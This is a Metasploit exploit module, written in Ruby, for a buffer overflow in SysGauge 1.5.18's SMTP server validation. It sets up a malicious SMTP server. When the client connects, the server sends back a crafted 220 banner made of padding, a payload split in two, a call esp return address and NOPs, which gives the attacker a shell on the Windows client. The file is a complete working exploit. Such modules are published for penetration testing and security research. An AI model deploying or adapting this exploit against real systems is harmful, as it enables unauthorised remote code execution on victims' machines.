# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
#

class MetasploitModule < Msf::Exploit::Remote
  include Msf::Exploit::Remote::TcpServer

  Rank = NormalRanking

  def initialize()
    super(
      &#039;Name&#039;           => &#039;SysGauge SMTP Validation Buffer Overflow&#039;,
      &#039;Description&#039;    => %q{
        This module will setup an SMTP server expecting a connection from SysGauge 1.5.18
        via its SMTP server validation. The module sends a malicious response along in the
        220 service ready response and exploits the client, resulting in an unprivileged shell.
      },
      &#039;Author&#039;         =>
      [
        &#039;Chris Higgins&#039;, # msf Module -- @ch1gg1ns
        &#039;Peter Baris&#039;    # Initial discovery and PoC
      ],
      &#039;License&#039;        => MSF_LICENSE,
      &#039;References&#039;     =>
      [
        [ &#039;EDB&#039;, &#039;41479&#039; ],
      ],
      &#039;DefaultOptions&#039; =>
      {
        &#039;EXITFUNC&#039; => &#039;thread&#039;
      },
      &#039;Payload&#039;        =>
      {
        &#039;Space&#039; => 306,
        &#039;BadChars&#039; => "\x00\x0a\x0d\x20"
      },
      &#039;Platform&#039;  => &#039;win&#039;,
      &#039;Targets&#039;       =>
      [
        [ &#039;Windows Universal&#039;,
          {
            &#039;Offset&#039; => 176,
            &#039;Ret&#039;    => 0x6527635E # call esp # QtGui4.dll
          }
        ]
      ],
      &#039;Privileged&#039;    => false,
      &#039;DisclosureDate&#039; => &#039;Feb 28 2017&#039;,
      &#039;DefaultTarget&#039; => 0
      )
    register_options(
      [
      OptPort.new(&#039;SRVPORT&#039;, [ true, "The local port to listen on.", 25 ]),
      ])
  end

  def on_client_connect(c)
    # Note here that the payload must be split into two parts.
    # The payload gets jumbled in the stack so we need to split
    # and align to get it to execute correctly.
    sploit =  "220 "
    sploit << rand_text(target[&#039;Offset&#039;])
    # Can only use the last part starting from 232 bytes in
    sploit << payload.encoded[232..-1]
    sploit << rand_text(2)
    sploit << [target.ret].pack(&#039;V&#039;)
    sploit << rand_text(12)
    sploit << make_nops(8)
    # And the first part up to 232 bytes
    sploit << payload.encoded[0..231]
    sploit << "ESMTP Sendmail \r\n"

    print_status("Client connected: " + c.peerhost)
    print_status("Sending payload...")

    c.put(sploit)
  end

end

